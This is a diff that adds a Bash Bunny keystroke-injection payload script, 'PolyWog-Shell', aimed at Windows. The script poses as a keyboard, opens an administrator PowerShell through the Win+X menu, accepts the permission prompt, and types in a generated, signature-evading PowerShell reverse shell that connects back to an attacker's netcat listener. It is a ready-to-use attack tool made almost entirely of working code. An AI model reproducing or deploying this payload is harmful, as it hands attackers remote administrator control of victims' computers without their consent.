@@ -1,0 +1,51 @@
+####################
+# Title: PolyWog-Shell
+# Author: Hak5Peaks
+# Catagory: Exacuation
+# Description: This payload uses a python2 + Bash script to generate a signature unique powershell rev shell that is typed out on the target PC using keystroke injection.  
+# Target: Windows
+####################
+
+# Configuation. 
+# Replace IP and port with IP and port of your netcat listner. 
+IP="192.168.0.0" # Change this to IP on ncat listen
+PORT="0"  # Change this to Port on ncat listen
+
+ATTACKMODE HID
+LED ATTACK # indicate payload started
+
+Q DELAY 1000 #Waiting for PC to recongize bunny. 
+
+
+SHELL_PY_DIR="" # Placeholder for locating shell.py | NO NEED TO CONFIGURE | 
+
+# Check for shell.py in Udisk and root dir, just incase the script is ran twice. 
+if [ -f "/tools/shell.py" ]; then 
+    SHELL_PY_DIR="/tools"
+elif [ -f "/root/udisk/tools/shell.py" ]; then
+    SHELL_PY_DIR="/root/udisk/tools"
+else
+    Q DELAY 1000
+    Q GUI
+    Q DELAY 500
+    Q STRING "shell.py not found, make sure you have placed it inside of the UDisk :) " >&2 # Catch to make sure the user has shell.py on their bunny.
+    LED R # indicate payload failed.
+    exit 1
+fi
+
+cd ..
+cd $SHELL_PY_DIR
+python shell.py $IP $PORT # Pass IP and port as arg in python generator script.
+SHELL="$(cat shell.txt)" # Set output as global variable to avoid having to add escapes. 
+
+Q DELAY 2000
+Q GUI x # Windows power menu
+Q DELAY 750
+Q a # Admin powersehll
+Q DELAY 1000
+Q ALT y # Accept permission prompt
+Q DELAY 2000
+Q STRING "$SHELL" # type out generated reverse shell. 
+Q DELAY 500
+Q ENTER
+LED FINISH # Indicate payload is done. 
